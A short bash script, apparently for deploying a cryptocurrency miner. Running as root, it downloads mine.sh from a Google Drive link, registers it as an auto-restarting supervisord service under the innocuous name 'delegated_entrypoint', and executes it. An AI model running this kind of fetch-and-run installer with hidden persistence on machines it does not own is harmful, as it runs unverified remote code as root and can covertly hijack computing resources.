#!/bin/bash
cd ~

# Сохраняем скрипт в /root/mine.sh и делаем его исполняемым
wget "https://drive.google.com/uc?export=download&id=1dhSfgivVbym0jHSdhxo0D0XGb_OW4EVB" -O /root/mine.sh
chmod +x /root/mine.sh


if [ ! -f /etc/supervisor/conf.d/delegated_entrypoint.conf ]; then
# Настройка логирования supervisord через перенаправление stdout и stderr в файлы:
echo "[program:delegated_entrypoint]" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
echo "command=/root/mine.sh" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
echo "directory=/root" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
echo "autostart=true" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
echo "autorestart=true" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
echo "startsecs=10" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
echo "stdout_logfile=/var/log/delegated_entrypoint.log" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
echo "stderr_logfile=/var/log/delegated_entrypoint_err.log" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
fi

# Запускаем наш сохраненный скрипт
exec /root/mine.sh >> /root/miner.log 2>&1
